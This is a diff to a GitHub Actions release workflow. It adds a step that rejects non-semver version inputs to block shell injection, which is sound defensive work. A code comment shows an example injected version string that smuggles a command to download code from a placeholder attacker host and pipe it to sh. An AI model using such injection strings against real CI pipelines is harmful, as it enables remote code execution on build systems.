@@ -18,6 +18,21 @@ jobs:
       id-token: write
 
     steps:
+      - name: Validate workflow_dispatch version input
+        # F10c: reject inputs that don't match strict semver before they
+        # reach any `run:` step. Without this, a maliciously-crafted
+        # version string like `0.2.1" ; curl evil.example | sh ; echo "`
+        # would land directly inside the shell commands that interpolate
+        # `${{ steps.get_version.outputs.version }}` further down.
+        if: github.event_name == 'workflow_dispatch'
+        env:
+          MOVEHAT_RAW_VERSION: ${{ github.event.inputs.version }}
+        run: |
+          if ! [[ "$MOVEHAT_RAW_VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-(alpha|beta|rc)(\.[0-9]+)?)?$ ]]; then
+            echo "::error::Invalid version input. Expected strict semver (e.g. 0.2.1, 0.2.1-rc.1)."
+            exit 1
+          fi
+
       - name: Checkout code
         uses: actions/checkout@v4
 
